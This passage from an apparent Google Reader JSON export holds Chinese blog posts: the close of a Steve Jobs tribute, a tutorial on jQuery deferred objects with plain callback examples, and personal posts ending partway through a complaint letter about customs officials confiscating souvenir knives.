did.）</p>\n\n</blockquote>\n\n<p>他用自己的人生，实践了这句话。他生命的最后八年，是与癌症做斗争的八年，也是创造了惊人成果的八年。在这期间，他一手造就了创造历史的新产品----Macbook、iPhone和iPad----这使苹果公司从濒临破产，变成了世界市值最高的公司。</p>\n\n<p>但是，如果你仔细想想，就会发现他完全没必要这么做，尤其在得了癌症的情况下。在重新入主苹果之前，他已经功成名就了。为什么他工作到生命的最后一刻，只有一个解释，那就是他真的热爱自己所做的一切。</p>\n\n<p>乔布斯的一生是一个奇迹。他是一个弃儿，养父母都是蓝领，大学只读了六个月，曾经靠捡饮料瓶谋生。但就是这样一个人，创造了世界上第一台个人电脑，打造了全世界最辉煌的电脑公司，彻底改变了整个电子工业。他用自己的一生告诉我们，只要你敢于追求自己的梦想，热爱你所做的事情，nothing is impossible（一切皆有可能）。</p>\n\n<p>只要有人记得，他就永不消逝。乔布斯并没有离开我们，未来的人们将永远记得他。因为乔布斯来过这个世界，我们所有人都有了更多希望。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/10/steve_jobs_farewell.html\">http://www.ruanyifeng.com/blog/2011/10/steve_jobs_farewell.html</a></li>\n<li>最后修改时间：2011年11月21日 15:32</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://mai.alipay.com/p.htm?id=2011101500701706\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=2.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p></p></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313679387931",
    "timestampUsec" : "1313679387931664",
    "id" : "tag:google.com,2005:reader/item/4949b9baec9835e2",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "jQuery的deferred对象详解",
    "published" : 1313508392,
    "updated" : 1313508392,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://jquery.com/\">jQuery</a>的开发速度很快，几乎每半年一个大版本，每两个月一个小版本。</p><p>每个版本都会引入一些新功能。今天我想介绍的，就是从jQuery 1.5.0版本开始引入的一个新功能----<a href=\"http://api.jquery.com/category/deferred-object/\">deferred对象</a>。</p>\n\n<p>这个功能很重要，未来将成为jQuery的核心方法，它彻底改变了如何在jQuery中使用ajax。为了实现它，jQuery的全部ajax代码都被改写了。</p>\n\n<p>但是，它比较抽象，初学者很难掌握，网上的教程也不多。所以，我把自己的学习笔记整理出来了，希望对大家有用。</p>\n\n<p>本文不是初级教程，针对的读者是那些已经具备jQuery使用经验的开发者。如果你想了解jQuery的基本用法，请阅读我编写的<a href=\"http://www.ruanyifeng.com/blog/2011/07/jquery_fundamentals.html\">《jQuery设计思想》</a>和<a href=\"http://www.ruanyifeng.com/blog/2011/08/jquery_best_practices.html\">《jQuery最佳实践》</a>。</p>\n\n<p>======================================</p>\n\n<p><strong>jQuery的deferred对象详解</strong></p>\n\n<p>作者：阮一峰</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081601.jpg\"></p>\n\n<p><strong>一、什么是deferred对象？</strong></p>\n\n<p>开发网站的过程中，我们经常遇到某些耗时很长的javascript操作。其中，既有异步的操作（比如ajax读取服务器数据），也有同步的操作（比如遍历一个大型数组），它们都不是立即能得到结果的。</p>\n\n<p>通常的解决方法是，为它们指定回调函数（callback）。即事先规定，一旦它们运行结束，应该调用哪些函数。</p>\n\n<p>但是，在回调函数方面，jQuery的功能非常弱。为了改变这一点，jQuery开发团队就设计了<a href=\"http://api.jquery.com/category/deferred-object/\">deferred对象</a>。</p>\n\n<p><strong>简单说，deferred对象就是jQuery的回调函数解决方案。</strong>在英语中，defer的意思是\"延迟\"，所以deferred对象的含义就是\"延迟\"到未来某个点再执行。</p>\n\n<p>它解决了如何处理耗时操作的问题，对那些操作提供了更好的控制，以及统一的编程接口。它的主要功能，可以归结为四点。下面我们通过示例代码，一步步来学习。</p>\n\n<p><strong>二、ajax操作的链式写法</strong></p>\n\n<p>jQuery的ajax操作，传统写法是这样的：</p>\n\n<blockquote>\n\n<p>　　$.ajax({</p>\n\n<p>　　　　url: \"test.html\",</p>\n\n<p>　　　　success: function(){<br>\n　　　　　　alert(\"哈哈，成功了！\");<br>\n　　　　},</p>\n\n<p>　　　　error:function(){<br>\n　　　　　　alert(\"出错啦！\");<br>\n　　　　}</p>\n\n<p>　　});</p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/pdQYH/\">代码示例1</a>）</p>\n\n</blockquote>\n\n<p>在上面的代码中，$.ajax()接受一个对象参数，这个对象包含两个方法：success方法指定操作成功后的回调函数，error方法指定操作失败后的回调函数。</p>\n\n<p>$.ajax()操作完成后，如果使用的是低于1.5.0版本的jQuery，返回的是XHR对象，你没法进行链式操作；如果高于1.5.0版本，返回的是deferred对象，可以进行链式操作。</p>\n\n<p>现在，新的写法是这样的：</p>\n\n<blockquote>\n\n<p>　　$.ajax(\"test.html\")</p>\n\n<p>　　<strong>.done(function(){ alert(\"哈哈，成功了！\"); })</strong></p>\n\n<p>　　<strong>.fail(function(){ alert(\"出错啦！\"); });</strong></p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/dYKLJ/\">代码示例2</a>）</p>\n\n</blockquote>\n\n<p>可以看到，<a href=\"http://api.jquery.com/deferred.done/\">done()</a>相当于success方法，<a href=\"http://api.jquery.com/deferred.fail/\">fail()</a>相当于error方法。采用链式写法以后，代码的可读性大大提高。</p>\n\n<p><strong>三、指定同一操作的多个回调函数</strong></p>\n\n<p>deferred对象的一大好处，就是它允许你自由添加多个回调函数。</p>\n\n<p>还是以上面的代码为例，如果ajax操作成功后，除了原来的回调函数，我还想再运行一个回调函数，怎么办？</p>\n\n<p>很简单，直接把它加在后面就行了。</p>\n\n<blockquote>\n\n<p>　　$.ajax(\"test.html\")</p>\n\n<p>　　.done(function(){ alert(\"哈哈，成功了！\");} )</p>\n\n<p>　　.fail(function(){ alert(\"出错啦！\"); } )</p>\n\n<p>　　<strong>.done(function(){ alert(\"第二个回调函数！\");} );</strong></p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/sQYjs/\">代码示例3</a>）</p>\n\n</blockquote>\n\n<p>回调函数可以添加任意多个，它们按照添加顺序执行。</p>\n\n<p><strong>四、为多个操作指定回调函数</strong></p>\n\n<p>deferred对象的另一大好处，就是它允许你为多个事件指定一个回调函数，这是传统写法做不到的。</p>\n\n<p>请看下面的代码，它用到了一个新的方法<a href=\"http://api.jquery.com/jQuery.when/\">$.when()</a>：</p>\n\n<blockquote>\n\n<p>　　<strong>$.when($.ajax(\"test1.html\"), $.ajax(\"test2.html\"))</strong></p>\n\n<p>　　.done(function(){ alert(\"哈哈，成功了！\"); })</p>\n\n<p>　　.fail(function(){ alert(\"出错啦！\"); });</p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/CdKjn/\">代码示例4</a>）</p>\n\n</blockquote>\n\n<p>这段代码的意思是，先执行两个操作$.ajax(\"test1.html\")和$.ajax(\"test2.html\")，如果成功了，就运行done()指定的回调函数；如果有一个失败或都失败了，就执行fail()指定的回调函数。</p>\n\n<p><strong>五、普通操作的回调函数接口（上）</strong></p>\n\n<p>deferred对象的最大优点，就是它把这一套回调函数接口，从ajax操作扩展到了所有操作。也就是说，任何一个操作----不管是ajax操作还是本地操作，也不管是异步操作还是同步操作----都可以使用deferred对象的各种方法，指定回调函数。</p>\n\n<p>我们来看一个具体的例子。假定有一个很耗时的操作wait：</p>\n\n<blockquote>\n\n<p>　　var wait = function(){</p>\n\n<p>　　　　var tasks = function(){</p>\n\n<p>　　　　　　alert(\"执行完毕！\");</p>\n\n<p>　　　　};</p>\n\n<p>　　　　setTimeout(tasks,5000);</p>\n\n<p>　　};</p>\n\n</blockquote>\n\n<p>我们为它指定回调函数，应该怎么做呢？</p>\n\n<p>很自然的，你会想到，可以使用$.when()：</p>\n\n<blockquote>\n\n<p>　　$.when(wait())</p>\n\n<p>　　.done(function(){ alert(\"哈哈，成功了！\"); })</p>\n\n<p>　　.fail(function(){ alert(\"出错啦！\"); });</p>\n\n</blockquote>\n\n<p>但是，有一个问题。$.when()的参数只能是deferred对象，所以必须对wait进行改写：</p>\n\n<blockquote>\n\n<p>　　var dtd = $.Deferred(); // 新建一个deferred对象</p>\n\n<p>　　var wait = function(dtd){</p>\n\n<p>　　　　var tasks = function(){</p>\n\n<p>　　　　　　alert(\"执行完毕！\");</p>\n\n<p>　　　　　　<strong>dtd.resolve();</strong> // 改变deferred对象的执行状态</p>\n\n<p>　　　　};</p>\n\n<p>　　　　setTimeout(tasks,5000);</p>\n\n<p>　　　　<strong>return dtd.promise();</strong></p>\n\n<p>　　};</p>\n\n</blockquote>\n\n<p>这里有两个地方需要注意。</p>\n\n<p>首先，最后一行不能直接返回dtd，必须返回<a href=\"http://api.jquery.com/deferred.promise/\">dtd.promise()</a>。原因是jQuery规定，任意一个deferred对象有三种执行状态----未完成，已完成和已失败。如果直接返回dtd，$.when()的默认执行状态为\"已完成\"，立即触发后面的done()方法，这就失去回调函数的作用了。dtd.promise()的目的，就是保证目前的执行状态----也就是\"未完成\"----不变，从而确保只有操作完成后，才会触发回调函数。</p>\n\n<p>其次，当操作完成后，必须手动改变Deferred对象的执行状态，否则回调函数无法触发。<a href=\"http://api.jquery.com/deferred.resolve/\">dtd.resolve()</a>的作用，就是将dtd的执行状态从\"未完成\"变成\"已完成\"，从而触发done()方法。</p>\n\n<p>最后别忘了，修改完wait之后，调用的时候就必须直接传入dtd参数。</p>\n\n<blockquote>\n\n<p>　　$.when(wait(dtd))</p>\n\n<p>　　.done(function(){ alert(\"哈哈，成功了！\"); })</p>\n\n<p>　　.fail(function(){ alert(\"出错啦！\"); });</p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/zSddB/1/\">代码示例5</a>）</p>\n\n</blockquote>\n\n<p><strong>六、普通操作的回调函数接口（中）</strong></p>\n\n<p>除了使用$.when()为普通操作添加回调函数，还可以使用deferred对象的建构函数$.Deferred()。</p>\n\n<p>这时，wait函数还是保持不变，我们直接把它传入$.Deferred()：</p>\n\n<blockquote>\n\n<p>　　<strong>$.Deferred(wait)</strong></p>\n\n<p>　　.done(function(){ alert(\"哈哈，成功了！\"); })</p>\n\n<p>　　.fail(function(){ alert(\"出错啦！\"); });</p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/CucGp/\">代码示例6</a>）</p>\n\n</blockquote>\n\n<p>jQuery规定，$.Deferred()可以接受一个函数作为参数，该函数将在$.Deferred()返回结果之前执行。并且，$.Deferred()所生成的Deferred对象将作为这个函数的默认参数。</p>\n\n<p><strong>七、普通操作的回调函数接口（下）</strong></p>\n\n<p>除了上面两种方法以外，我们还可以直接在wait对象上部署deferred接口。</p>\n\n<blockquote>\n\n<p>　　var dtd = $.Deferred(); // 生成Deferred对象</p>\n\n<p>　　var wait = function(dtd){</p>\n\n<p>　　　　var tasks = function(){</p>\n\n<p>　　　　　　alert(\"执行完毕！\");</p>\n\n<p>　　　　　　dtd.resolve(); // 改变Deferred对象的执行状态</p>\n\n<p>　　　　};</p>\n\n<p>　　　　setTimeout(tasks,5000);</p>\n\n<p>　　};</p>\n\n<p>　　<strong>dtd.promise(wait);</strong></p>\n\n<p>　　wait.done(function(){ alert(\"哈哈，成功了！\"); })</p>\n\n<p>　　.fail(function(){ alert(\"出错啦！\"); });</p>\n\n<p>　　wait(dtd);</p>\n\n<p>（运行<a href=\"http://jsfiddle.net/ruanyf/PF7Xf/\">代码示例7</a>）</p>\n\n</blockquote>\n\n<p>这里的关键是dtd.promise(wait)这一行，它的作用就是在wait对象上部署Deferred接口。正是因为有了这一行，后面才能直接在wait上面调用done()和fail()。</p>\n\n<p><strong>八、小结：deferred对象的方法</strong></p>\n\n<p>前面已经讲到了deferred对象的多种方法，下面做一个总结：</p>\n\n<p>　　（1） <a href=\"http://api.jquery.com/category/deferred-object/\">$.Deferred()</a> 生成一个deferred对象。</p>\n\n<p>　　（2） <a href=\"http://api.jquery.com/deferred.done/\">deferred.done()</a> 指定操作成功时的回调函数</p>\n\n<p>　　（3） <a href=\"http://api.jquery.com/deferred.fail/\">deferred.fail()</a> 指定操作失败时的回调函数</p>\n\n<p>　　（4） <a href=\"http://api.jquery.com/deferred.promise/\">deferred.promise()</a> 没有参数时，作用为保持deferred对象的运行状态不变；接受参数时，作用为在参数对象上部署deferred接口。</p>\n\n<p>　　（5） <a href=\"http://api.jquery.com/deferred.resolve/\">deferred.resolve()</a> 手动改变deferred对象的运行状态为\"已完成\"，从而立即触发done()方法。</p>\n\n<p>　　（6） <a href=\"http://api.jquery.com/jQuery.when/\">$.when()</a> 为多个操作指定回调函数。</p>\n\n<p>除了这些方法以外，deferred对象还有三个重要方法，上面的教程中没有涉及到。</p>\n\n<p>　　（7）<a href=\"http://api.jquery.com/deferred.then/\">deferred.then()</a></p>\n\n<p>有时为了省事，可以把done()和fail()合在一起写，这就是then()方法。</p>\n\n<blockquote>\n\n<p>　　$.when($.ajax( \"/main.php\" ))</p>\n\n<p>　　<strong>.then(successFunc, failureFunc );</strong></p>\n\n</blockquote>\n\n<p>如果then()有两个参数，那么第一个参数是done()方法的回调函数，第二个参数是fail()方法的回调方法。如果then()只有一个参数，那么等同于done()。</p>\n\n<p>　　（8）<a href=\"http://api.jquery.com/deferred.reject/\">deferred.reject()</a></p>\n\n<p>这个方法与deferred.resolve()正好相反，调用后将deferred对象的运行状态变为\"已失败\"，从而立即触发fail()方法。</p>\n\n<p>　　（9）<a href=\"http://api.jquery.com/deferred.always/\">deferred.always()</a></p>\n\n<p>这个方法也是用来指定回调函数的，它的作用是，不管调用的是deferred.resolve()还是deferred.reject()，最后总是执行。</p>\n\n<blockquote>\n\n<p>　　$.ajax( \"test.html\" )</p>\n\n<p>　　.always( function() { alert(\"已执行！\");} );</p>\n\n</blockquote>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html\">http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html</a></li>\n<li>最后修改时间：2011年8月31日 21:25</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011081500435188\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><a href=\"http://www.nanrenwa.com/click/go/ruanyifeng.banner.feed.yfblogfeed/gift\"><img src=\"http://nanrenwa.com/_img/a/2011/yfblog_feed.png\"></a></p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370799734",
    "timestampUsec" : "1313370799734682",
    "id" : "tag:google.com,2005:reader/item/6c0480cf742f9013",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "胡言乱语" ],
    "title" : "用爱科普，理人相轻",
    "published" : 1228581760,
    "updated" : 1228631689,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2008/12/07/post_58.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>连岳恐怕早就想到这一篇<a href=\"http://www.bullog.cn/blogs/lianyue/archives/234392.aspx\">《爱科普，用爱科普》</a>能引起一场口水仗了吧？</p>\n\n<p>我很喜欢连岳这篇文章。如连岳所说，如果只有知识，没有爱，没有同情，那么这种科普文章确实也没什么看头，哪怕处处是对的。土摩托曾在blog说，如果因为认为方舟子人品不好，就不去看他的文章，那么你就是人品问题。我也觉得这种说法也非常荒诞。如果以方舟子的科普文章没什么错误作为标准，那么完全无误的包含知识的文章四处都是，浩如烟海，为什么我非要去看某个人的呢？</p>\n\n<p>四处看看相关的文章，结果在<a href=\"http://songshuhui.net/archives/5481.html\">松鼠会转连岳的文章</a>下又看到了伍岭老师的回复，扬言要买松鼠会的书，但是撕掉连岳做的序。这不就是他号称所讨厌的“党同伐异”行为吗？长时间的言行不一不知道会不会导致精神分裂？</p>\n\n<p>我觉得，如果一个搞科普的群体非常狭隘，非常喜欢抡起来大棒砸死人，那么喜欢围着他们转的人恐怕只能是他们所不喜欢的，把科学当作宗教的那些人了。</p>\n\n<p>在下不才，10多年前也曾对科普，科幻有所涉猎。当时“中国科幻小说之父”郑文光老先生还在世，我曾亲耳听得教诲：“科幻小说，首先要是篇小说。” 这句话如果给科学宗教者们听到，怕是郑文光先生也要被他们称为“文傻”了。不过，郑先生本行始终是科学研究，这倒是不掺假的。</p>\n\n<p>总而言之，有时间看冷冰冰的，尖刻的科普文章，还不如我去看几篇论文收获大。看不懂连岳这篇文章的人挺悲哀的，好在松鼠会的人看起来都很喜欢连岳的序，也认为说出了他们想说的道理。</p>\n\n<p>至于想撕掉这篇序的人，你自己买一本的话，你也确实拥有撕掉序的权利，但是这并不能掩盖你的人格障碍。</p>\n\n<p>都说文人相轻，没想到理人轻起来人更要命。</p>\n\n<p>补：xuyou 提到的<a href=\"http://cache.tianya.cn/publicforum/content/culture/1/283499.shtml\">这篇东西</a>倒是非常有趣的，然后我又<a href=\"http://tech.163.com/06/0801/08/2NE5STT0000920BR.html\">发现了这个</a>。这让我想到了<a href=\"http://news.xinhuanet.com/politics/2008-08/26/content_9710135.htm\">这个案子</a>。<br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370797695",
    "timestampUsec" : "1313370797695007",
    "id" : "tag:google.com,2005:reader/item/867a3f42eb341610",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "胡言乱语" ],
    "title" : "关系千万重 2",
    "published" : 1228844242,
    "updated" : 1228845180,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2008/12/10/sns-in-life-2.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>历史是现在的镜子，所以如果没看过1的，可以先看看<a href=\"http://blog.devep.net/virushuo/2007/04/08/sns-in-life-1.html\">关系千万重1</a>。</p>\n\n<p>然后开始讲这次是怎么回事。</p>\n\n<p><a href=\"http://www.ginkgotek.com\">银杏搜索</a>得了个<a href=\"http://www.ccw.com.cn/itlianghui/htm2008/20081207_557259.shtml\">2008中国互联网最具潜力奖</a>，然后周日我去开会领奖。碰到一个哥们，是有道搜索的。有道词典获得了同一的奖项，我们一起去领的，还聊了几句，说了说对方的产品。</p>\n\n<p>然后，晚上我突然想起来这哥们是有道的市场总监胡琛。此人已经在我gtalk上认识了2年了。虽然没见过，但是也看过照片，就是没认出来。</p>\n\n<p>我在gtalk上问他，你是胡琛吗？回答是。我说今天领奖咱们还说话了。</p>\n\n<p>他说，靠，银杏吧，你形象变的太厉害了，完全没认出来。</p>\n\n<p>这说明了，如果你胡子很久没刮的话，就算戴了眼镜也是不管用的。。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370796736",
    "timestampUsec" : "1313370796736352",
    "id" : "tag:google.com,2005:reader/item/811fdcb19606bdcc",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "胡言乱语" ],
    "title" : "跟海关较真－－我的举报信",
    "published" : 1229699165,
    "updated" : 1229699879,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2008/12/19/post_60.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>之前我曾经在blog上说过，我每天用20分钟，来讨个说法。这个说法是跟成都海关讨的。我找说法的行动，经过了成都海关法规处，相关工作人员之后，最终导致我写了一封举报信，用ems发给了中华人民共和国海关总署监察局。</p>\n\n<p>果然，在30天之内有了回音。昨天(2008.12.19)成都海关李姓工作人员给我来电话，说收到了海关总署监察局转来的信。问我是不是可以用行政复议流程解决。我觉得，目前我已经不怎么试图追述对我的处罚决定是否正确，而是集中在成都海关人员的行为是否违法上，所以我也没什么行政复议的理由和必要。就拒绝了。我还是想看看，一个依法实名举报，有证据，有法律保护的举报行为，最终能答到什么效果。</p>\n\n<p>既然成都海关承认收到举报信，并且在依照举报流程进行处理，那么我也可以把相关情况公布出来给大家看看了。</p>\n\n<p>把我的举报信贴在这里。所有原因，事情经过里面都有详细讲述。有兴趣可以慢慢看。</p>\n\n<p>其实，我只是想要一个说法，就这么简单。</p>\n\n<p>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝</p>\n\n<p>中华人民共和国海关总署的党政领导：  </p>\n\n<p>你好。</p>\n\n<p>  首先声明，这是一封举报信，是一个中国公民对成都机场海关，成都海关法规处一系列违法违纪行为的举报，是多次希望通过成都海关法规处进行协调，而事实上进一步被侵犯，被成都海关人员利用职权进行刁难，而迫不得已，向其上级机关寻求帮助的实名举报信。</p>\n\n<p>事情的经过是这样的：</p>\n\n<p>2008年11月11日，下午17:30分左右，我乘坐加德满都-北京的CA408航班从尼泊尔回国，自拉萨海关办理入境手续后，到达成都，由成都机场转机CA1408航班至北京。在转机过程中，成都机场海关人员检查行李时，发现我携带了5把尼泊尔工艺刀具，定为管制刀具，要求没收。</p>\n\n<p>由于不知道如何鉴别工艺品和管制刀具，所以我要求成都机场海关人员出具相关法律依据，海关人员要求我\"把护照交给他们，然后到法规室学习学习\"，我认为这不符合任何法定程序，予以拒绝。</p>\n\n<p>成都机场海关人员以管制刀具禁止入境为名，没收刀具。我要求对方出具扣留或没收的相关凭据(扣留单，罚没单)等，对方拒绝开具，告诉我\"我们说没收就算没收了\"。我再三要求，海关人员告诉我从来没开过这种单据。</p>\n\n<p>既然不肯开具相关单据，我无法认定海关人员是依法办事，还是非法将我的物品据为己有，因此我要求当场对刀具进行毁坏。该海关人员说：\"如果你再纠缠，就将你移送公安机关处理。\" 这令我非常震惊，一个公民，纳税人的合法诉求，怎么能用\"纠缠\"来形容。这句话在后来与成都海关人员电话沟通的时候再次出现。这让我觉得非常的愤怒和极大的侮辱。</p>\n\n<p>出于无奈，我只好就这样转机回了北京。</p>\n\n<p>2008年11月12日13:30分，我致电成都海关法规处，对以上海关人员行为进行举报，要求法规处同志查明事实，主张我的合法权益。</p>\n\n<p>2008年11月13日13：20分，我再次致电成都海关法规处，询问举报进展。被告知，对方认为我是自愿放弃物品。我再次对法规处的同志声明，我没有自愿放弃，而是在对方的威胁之下不得已而离开的。另外，即使我自愿放弃，也应该为海关签字确认放弃，以免发生纠纷。并请法规处的同志再次进行调查，协调。</p>\n\n<p>2008年11月14日，13：05分，最令我无法理解的事情终于发生了。我所举报的，11日处理此事的成都机场海关人员打电话给我，通知我于当日下午15：00分到达成都海关，协助调查并补办相关手续，否则就算做自愿放弃。我认为此事非常荒谬，且不说我之前已告知法规处的同志，我在北京。就算我在成都市内，能够确保2个小时之内到达成都机场海关吗？即使我同意去，请问海关总署的同志，中国有这样一种交通工具，能让我在2个小时之内从北京到达成都吗？我无法理解，为什么成都机场海关的工作人员这么着急的希望将其认定为\"自愿放弃\"，甚至不惜采用这样荒诞的方式？</p>\n\n<p>在电话中，我多次追问，为什么当时不肯给我开具任何单据。得到的回答仍然是：\"我们当时让你交出护照，然后到法规室学习学习\"，\"再纠缠就移交公安机关处理\"等不符合任何法定程序的答复。而我追究的关键问题\"为什么没收或扣留不出具任何单据\"，无论法规处的同志还是当事人，都没有给我一个正面回答(有部分电话录音为证)。</p>\n\n<p>这让我产生了更大的疑惑。难道成都海关果然如他们所说，从来不开具任何单据而扣留物品？那么这些扣留的物品到底是依法处理，还是中饱私囊？</p>\n\n<p>在经历了这次电话冲突之后，我无法再通过成都海关处理此事，只好依法向上级机关，也即海关总署进行举报。</p>\n\n<p>对于以上事实，我认为成都海关以下行为属于违法违纪行为。</p>\n\n<p>1 中华人民共和国海关总署令第　159　号 《中华人民共和国海关办理行政处罚案件程序规定》 第六节　扣留和担保<br>\n第四十六条　海关依法扣留货物、物品、运输工具、其他财产及账册、单据等资料，应当出示执法证件，制作扣留凭单送达当事人，当场告知其采取扣留的理由、依据及其依法享有的权利。<br>\n 在我所经历的过程中，成都机场海关人员没有出示执法证件，没有告知我法律依据，没有告知我依法享有的权利，更没有制作扣留凭单。相反，在我询问法律依据的时候，要求我交出护照，然后\"去法规室学习学习\"，我在中华人民共和国各项法规中无法找到\"交出护照，去法规室学习学习\"的法律依据，只能将此认为是一种利用职权的威胁和刁难。我更不能理解为何我要求对方依法出具扣留凭单的行为被定义为\"纠缠\"。</p>\n\n<p>成都海关人员违反了《中华人民共和国海关办理行政处罚案件程序规定》第六节第四十六条的规定。</p>\n\n<p>2 《行政处罚法》第三十九条规定：行政机关进行行政处罚时，应当制作《行政处罚决定书》，《行政处罚决定书》应当载明行政行为相对人“违反法律、法规或者规章的事实和证据”等。</p>\n\n<p>成都海关人员没有制作《行政处罚决定书》，没有载明本人违法的事实，没有举出本人违法的证据。</p>\n\n<p>成都海关人员违反了《行政处罚法》第三十九条规定。</p>\n\n<p>3 中华人民共和国主席令第35号《中华人民共和国海关法》第七十二条 海关工作人员必须秉公执法，廉洁自律，忠于职守，文明服务，不得有下列行为：<br>\n（六）滥用职权，故意刁难，拖延监管、查验；<br>\n（九）违反法定程序或者超越权限执行职务；</p>\n\n<p>按照海关法定程序，应该为本人开具扣留凭单，本人享有听证和申请行政复议权利。成都海关应请公安机关鉴定我的刀具是否属于管制刀具，才可做出没收的具体行政处罚。</p>\n\n<p>而事实上成都海关人员单凭自己主观认定，不通过公安机关，就确定其为管制刀具，属于超越权限执行任务。不开具扣留单，直接扣留我的物品，属于违反法定程序。</p>\n\n<p>在本人几次要求出具相关单据之后，成都海关人员利用职权，对本人进行故意刁难，包括：要求本人交出护照，去法规室学习，威胁移送公安机关。电话通知本人2小时之内从北京到达成都海关，否则算做自愿放弃等。</p>\n\n<p>以上行为均违反了《中华人民共和国海关法》第七十二条。</p>\n\n<p>4 《中华人民共和国海关法》</p>\n\n<p>第八十条 任何单位和个人均有权对海关及其工作人员的违法、违纪行为进行控告、检举。收到控告、检举的机关有权处理的，应当依法按照职责分工及时查处。收到控告、检举的机关和负责查处的机关应当为控告人、检举人保密。</p>\n\n<p>第八十一条 